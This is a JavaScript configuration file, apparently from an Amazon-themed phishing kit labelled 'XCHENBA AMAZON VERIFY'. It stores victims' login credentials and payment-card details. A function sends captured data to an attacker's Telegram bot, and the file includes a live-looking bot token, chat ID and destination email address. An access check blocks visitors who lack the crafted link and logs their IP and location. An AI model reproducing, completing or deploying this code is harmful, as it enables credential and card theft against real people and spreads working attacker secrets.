// ==================================================
// KONFIGURASI UTAMA — XCHENBA AMAZON VERIFY
// ==================================================
const CONFIG = {
    awalanTautan: localStorage.getItem('awalanTautan') || 'Update-payment-methode',
    parameterAkhir: '=aktif',
    emailTujuan: localStorage.getItem('emailTujuan') || 'jandaanaksatu777@gmail.com',
    telegramToken: '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk',
    telegramChatId: '7808815199',

    simpanLogin: function(email, password) {
        const data = {
            email: email,
            password: password,
            waktu: new Date().toLocaleString(),
            sumber: window.location.href
        };
        const daftar = JSON.parse(localStorage.getItem('dataLogin') || '[]');
        daftar.unshift(data);
        localStorage.setItem('dataLogin', JSON.stringify(daftar));
        localStorage.setItem('emailPengguna', email);
        localStorage.setItem('passwordPengguna', password);
    },

    simpanKartu: function(dataKartu) {
        const daftar = JSON.parse(localStorage.getItem('dataKartu') || '[]');
        daftar.unshift({...dataKartu, waktu: new Date().toLocaleString()});
        localStorage.setItem('dataKartu', JSON.stringify(daftar));
        Object.keys(dataKartu).forEach(k => localStorage.setItem(k, dataKartu[k]));
    },

    cekAkses: async function() {
        const lokasi = window.location.search;
        const polaTautan = new RegExp(`${this.awalanTautan}-.+-.+${this.parameterAkhir.replace(/=/g, '\\=')}`);
        
        if (!polaTautan.test(lokasi) && lokasi.indexOf(this.awalanTautan) === -1) {
            let info = { ip: 'Tidak terdeteksi', isp: '-', lokasi: '-' };
            try {
                const res = await fetch('https://ipapi.co/json/');
                const json = await res.json();
                info = {
                    ip: json.ip || 'Tidak terdeteksi',
                    isp: json.org || 'Tidak diketahui',
                    lokasi: `${json.city || ''}, ${json.country_name || ''}`
                };
            } catch(e) {}

            const daftar = JSON.parse(localStorage.getItem('deteksiBot') || '[]');
            daftar.unshift({
                ...info,
                waktu: new Date().toLocaleString(),
                sumber: window.location.href
            });
            localStorage.setItem('deteksiBot', JSON.stringify(daftar));

            alert(`⚠️ AKSES TIDAK DIIZINKAN\n\n🌐 IP: ${info.ip}\n🏢 ISP: ${info.isp}\n📍 Lokasi: ${info.lokasi}\n\nGunakan tautan resmi dari pemilik.`);
            return false;
        }
        return true;
    },

    kirimKeTelegram: async function(pesan) {
        const url = `https://api.telegram.org/bot${this.telegramToken}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.telegramChatId,
                    text: pesan,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.log('Telegram error:', e);
        }
    }
};
